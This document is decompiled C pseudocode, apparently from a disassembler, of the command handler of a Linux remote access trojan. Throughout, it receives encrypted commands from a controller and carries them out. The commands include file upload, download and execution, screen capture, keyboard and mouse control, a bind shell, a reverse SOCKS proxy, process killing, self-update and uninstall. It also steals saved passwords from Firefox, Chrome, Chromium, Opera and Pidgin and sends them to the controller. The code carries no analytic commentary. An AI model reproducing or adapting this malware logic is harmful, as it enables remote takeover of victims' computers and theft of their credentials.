_DWORD *__usercall ProcessData@<eax>(int a1@<ebp>, void *arg, int a3, char *filename, int a5)
{
  unsigned __int8 v5; // si@1
  char *v6; // ebx@1
  int v7; // edi@1
  _DWORD *result; // eax@1
  int v9; // eax@9
  int v10; // ST2C_4@9
  _DWORD *v11; // esi@14
  int v12; // edx@15
  int v13; // eax@15
  int v14; // edx@15
  char v15; // al@15
  KeySym v16; // eax@17
  KeySym v17; // eax@18
  int v18; // eax@25
  int v19; // edx@25
  int v20; // eax@25
  int v21; // edx@25
  char v22; // al@25
  char v23; // al@28
  _DWORD *v24; // esi@29
  int v25; // eax@31
  _DWORD *v26; // esi@35
  void *v27; // eax@36
  _DWORD *v28; // esi@49
  bool v29; // zf@50
  void *v30; // eax@50
  int v31; // eax@50
  int v32; // eax@53
  int v33; // eax@57
  const char *v34; // edi@59
  int v35; // eax@56
  int *v36; // eax@76
  _DWORD *v37; // esi@87
  int ptr; // [sp+10h] [bp-282Ch]@9
  __int16 v39; // [sp+14h] [bp-2828h]@21
  char new; // [sp+1010h] [bp-182Ch]@9
  char old; // [sp+2010h] [bp-82Ch]@9
  int v42; // [sp+2810h] [bp-2Ch]@38
  int v43; // [sp+2814h] [bp-28h]@55
  int v44; // [sp+2818h] [bp-24h]@55
  int v45; // [sp+281Ch] [bp-20h]@55

  v5 = a3;
  v6 = filename;
  v7 = a5;
  result = (_DWORD *)(a3 - 1);
  if ( (unsigned __int8)(a3 - 1) <= 0x3Du )
  {
    if ( a5 > 0 && (void *)AuthenticatedSocket == arg && DecryptionContext )
      AESCryptCFB(DecryptionContext, 2, a5, &InitializationVector, filename, filename);
    result = (_DWORD *)(unsigned __int8)(v5 - 1);
    switch ( v5 )
    {
      case 1u:
        return (_DWORD *)SendData((int)arg, 1, 0, 0);
      case 5u:
        if ( (unsigned __int8)ParseAuthenticationPacket((int)arg, (int)v6, (int)(v6 + 32)) )
        {
          cpGetComputerName(&new, 2048);
          cpGetOSVersion(&ptr, 0x800u);
          v9 = cpGetUsername();
          v10 = __snprintf_chk(&old, 2048, 1, 2048, "%c%.8x%s\a%s @ %s\a%s\a", 2, 16998656, &HostId, v9, &new, &ptr, a1);
          result = (_DWORD *)SendData((int)arg, 5, (int)&old, v10);
        }
        else
        {
          cpSleep(0x2710u);
          result = (_DWORD *)CloseSocket(&arg);
        }
        return result;
      case 0xAu:
        return (_DWORD *)cpListDrives((int)arg);
      case 0xCu:
        return (_DWORD *)cpListFiles((int)arg, v6);
      case 0xEu:
        result = malloc(0x2024u);
        v11 = result;
        if ( !result )
          return result;
        StrSplit(v6, 7, 1, result, 4096);
        StrSplit(v6, 7, 2, &old, 2048);
        v11[2052] = cpGetFileSize(v11);
        v11[2053] = v12;
        v13 = StrToInt64(&old);
        v11[2055] = v14;
        v11[2054] = v13;
        StrSplit(v6, 7, 3, &old, 2048);
        v15 = StrToInt(&old);
        *((_BYTE *)v11 + 8200) = 14;
        *((_BYTE *)v11 + 8201) = 15;
        *((_BYTE *)v11 + 8202) = 16;
        v11[2049] = 1;
        *((_BYTE *)v11 + 8224) = v15;
        goto LABEL_26;
      case 0x31u:
        return (_DWORD *)cpScreenCapture((int)arg, *v6, v6[1] != 0);
      case 0x2Cu:
        v16 = StrToInt(v6);
        return (_DWORD *)cpKeyUp(v16);
      case 0x2Du:
        v17 = StrToInt(v6);
        return (_DWORD *)cpKeyDown(v17);
      case 0x2Eu:
        return (_DWORD *)cpMouseUp(*(_DWORD *)v6, *((_WORD *)v6 + 2));
      case 0x2Fu:
        return (_DWORD *)cpMouseDown(*(_DWORD *)v6, *((_WORD *)v6 + 2));
      case 0x30u:
        ptr = *(_DWORD *)v6;
        v39 = *((_WORD *)v6 + 2);
        return (_DWORD *)cpMouseMove(ptr);
      case 0x35u:
        return (_DWORD *)cpGetLog((int)arg);
      case 0x34u:
        return (_DWORD *)cpClearLog();
      case 0x11u:
        result = malloc(0x2024u);
        v11 = result;
        if ( result )
        {
          StrSplit(v6, 7, 1, result, 4096);
          StrSplit(v6, 7, 2, v11 + 1024, 4096);
          StrSplit(v6, 7, 3, &old, 2048);
          v18 = StrToInt64(&old);
          v11[2053] = v19;
          v11[2052] = v18;
          StrSplit(v6, 7, 4, &old, 2048);
          v20 = StrToInt64(&old);
          v11[2055] = v21;
          v11[2054] = v20;
          StrSplit(v6, 7, 5, &old, 2048);
          v22 = StrToInt(&old);
          v11[2049] = 0;
          *((_BYTE *)v11 + 8200) = 17;
          *((_BYTE *)v11 + 8224) = v22;
LABEL_26:
          v11[2051] = arg;
          result = (_DWORD *)cpBeginThread((void *(*)(void *))TransferFile, v11);
        }
        return result;
      case 0x12u:
        return (_DWORD *)FileUploadWrite((int)arg, (int)v6, v7);
      case 0x10u:
      case 0x13u:
        v23 = StrToInt(v6);
        return (_DWORD *)CloseTransfer(v23);
      case 0x14u:
        result = malloc(0x2201u);
        v24 = result;
        if ( result )
        {
          StrSplit(v6, 7, 1, result, 4352);
          StrSplit(v6, 7, 2, v24 + 1088, 4352);
          *((_BYTE *)v24 + 8704) = 1;
          result = (_DWORD *)cpBeginThread((void *(*)(void *))cpCopyFile, v24);
        }
        return result;
      case 0x15u:
        StrSplit(v6, 7, 1, &old, 2048);
        StrSplit(v6, 7, 2, &ptr, 4096);
        StrSplit(v6, 7, 3, &new, 4096);
        v25 = StrToInt(&new);
        return (_DWORD *)cpExecuteFile(&old, (char *)&ptr, v25);
      case 0x16u:
        StrSplit(v6, 7, 1, &old, 2048);
        StrSplit(v6, 7, 2, &new, 4096);
        return (_DWORD *)cpRenameFile(&old, &new);
      case 0x17u:
        return (_DWORD *)cpDeleteFile(v6);
      case 0x18u:
        return (_DWORD *)cpMkDir(v6);
      case 0x19u:
        result = malloc(0x2108u);
        v26 = result;
        if ( result )
        {
          StrSplit(v6, 7, 1, result, 4352);
          StrSplit(v6, 7, 2, v26 + 1088, 4096);
          v27 = arg;
          v26[2112] = 0;
          v26[2113] = v27;
          result = (_DWORD *)cpBeginThread((void *(*)(void *))cpSearchFiles, v26);
          SearchPId = (int)result;
        }
        return result;
      case 0x1Au:
        SearchPId = 0;
        return (_DWORD *)SendData((int)arg, 26, 0, 0);
      case 0x1Cu:
        IsX11LibAPILoaded(&v42);
        result = (_DWORD *)cpBeginThread((void *(*)(void *))BindShell, arg);
        ShellPId = (__pid_t)result;
        return result;
      case 0x1Du:
        if ( ShellPId )
          kill(ShellPId, 9);
        ShellPId = 0;
        return (_DWORD *)SendData((int)arg, 29, 0, 0);
      case 0x1Eu:
        return (_DWORD *)WriteCommand(v6);
      case 0x20u:
        return (_DWORD *)cpSystemInformation((int)arg);
      case 0x22u:
        return (_DWORD *)cpLogonSessions(arg);
      case 0x24u:
        return (_DWORD *)cpListProcesses((int)arg);
      case 0x26u:
        return (_DWORD *)cpKillProcess(v6);
      case 0x27u:
        return (_DWORD *)ListWindows((int)arg);
      case 0x28u:
        return (_DWORD *)ProcessWindowCommand(v6);
      case 0x29u:
        result = malloc(0x3310u);
        v28 = result;
        if ( !result )
          return result;
        StrSplit(v6, 7, 1, result, 4352);
        StrSplit(v6, 7, 2, v28 + 1088, 4352);
        StrSplit(v6, 7, 3, v28 + 2176, 4352);
        StrSplit(v6, 7, 4, &old, 2048);
        v28[3265] = StrToInt(&old);
        StrSplit(v6, 7, 5, &old, 2048);
        v29 = StrToInt(&old) == 0;
        v30 = arg;
        *((_BYTE *)v28 + 13056) = !v29;
        v28[3267] = v30;
        v31 = TranslateMacros(v28 + 2176);
        v42 = v31;
        if ( v31 )
        {
          StrCopy(v28 + 2176, v31, 4352);
          ReleaseHeap(&v42);
        }
        goto LABEL_54;
      case 0x2Bu:
        result = malloc(0x3310u);
        v28 = result;
        if ( result )
        {
          StrSplit(v6, 7, 1, result, 4352);
          StrSplit(v6, 7, 2, v28 + 1088, 4352);
          StrSplit(v6, 7, 3, &old, 2048);
          v28[3265] = StrToInt(&old);
          StrSplit(v6, 7, 4, &old, 2048);
          __snprintf_chk(v28 + 2176, 4352, 1, 4352, "/tmp/%s");
          StrSplit(v6, 7, 5, &old, 2048);
          v32 = StrToInt(&old);
          v28[3267] = 0;
          v28[3266] = 0;
          *((_BYTE *)v28 + 13056) = v32 != 0;
LABEL_54:
          result = (_DWORD *)cpBeginThread((void *(*)(void *))cpDownloadFile, v28);
        }
        return result;
      case 0x38u:
      case 0x39u:
        v42 = 0;
        v43 = 0;
        v44 = 0;
        v45 = 0;
        switch ( StrToInt(v6) )
        {
          case 1:
            v35 = GetMozillaProductPasswords(1);
            goto LABEL_62;
          case 4:
            v33 = GetGoogleChromePasswords();
            goto LABEL_59;
          case 5:
            v33 = GetChromiumPasswords();
LABEL_59:
            v34 = (const char *)v33;
            v42 = v33;
            goto LABEL_63;
          case 3:
            v42 = GetOperaWand(&v44);
            break;
          case 6:
            v35 = GetMozillaProductPasswords(6);
LABEL_62:
            v42 = v35;
            v34 = (const char *)v35;
LABEL_63:
            if ( v34 )
              v44 = strlen(v34);
            break;
          default:
            v42 = GetMozillaProductPasswords(1);
            v43 = GetGoogleChromePasswords();
            if ( v43 )
              v42 = aStrConcatenate(&v42, -1, &v43, -1, 1);
            v43 = GetChromiumPasswords();
            if ( v43 )
              v42 = aStrConcatenate(&v42, -1, &v43, -1, 1);
            v43 = GetMozillaProductPasswords(6);
            if ( v43 )
              v42 = aStrConcatenate(&v42, -1, &v43, -1, 1);
            if ( v42 )
              v44 = strlen((const char *)v42);
            v43 = GetOperaWand(&v45);
            if ( v43 )
            {
              v42 = aStrConcatenate(&v42, v44, &v43, v45, 1);
              v44 += v45;
            }
            break;
        }
        if ( !v42 )
          goto LABEL_82;
        SendData((int)arg, v5, v42, v44);
        v36 = &v42;
        goto LABEL_81;
      case 0x3Au:
      case 0x3Bu:
        StrToInt(v6);
        v43 = GetPidginPasswords();
        goto LABEL_79;
      case 0x3Cu:
      case 0x3Du:
        StrToInt(v6);
        v43 = GetMozillaProductPasswords(2);
LABEL_79:
        if ( v43 )
        {
          SendData((int)arg, v5, v43, -1);
          v36 = &v43;
LABEL_81:
          result = (_DWORD *)ReleaseHeap(v36);
        }
        else
        {
LABEL_82:
          result = (_DWORD *)SendData((int)arg, v5, 0, 0);
        }
        return result;
      case 8u:
        TerminateRunningOperations();
        CloseSocket(&arg);
        return (_DWORD *)cpSleep(0x7D0u);
      case 9u:
        UninstallHost();
        goto LABEL_85;
      case 7u:
LABEL_85:
        TerminateRunningOperations();
        CloseSocket(&arg);
        CloseMutexHandle();
        exit(0);
        return result;
      case 6u:
        result = malloc(0x3310u);
        v37 = result;
        if ( result )
        {
          StrSplit(v6, 7, 1, result, 4352);
          StrSplit(v6, 7, 2, v37 + 1088, 4352);
          StrSplit(v6, 7, 3, &old, 2048);
          v37[3265] = StrToInt(&old);
          StrSplit(v6, 7, 4, &old, 2048);
          __snprintf_chk(v37 + 2176, 4352, 1, 4352, "/tmp/%s", &old);
          v37[3267] = 0;
          v37[3266] = 0;
          result = (_DWORD *)cpBeginThread((void *(*)(void *))UpdateHost, v37);
        }
        break;
      case 0x3Eu:
        result = malloc(0xCu);
        if ( result )
        {
          result[1] = *(_DWORD *)v6;
          result[2] = *((_DWORD *)v6 + 1);
          result = (_DWORD *)cpBeginThread((void *(*)(void *))StartReverseSocks, result);
        }
        break;
      default:
        return result;
    }
  }
  return result;
}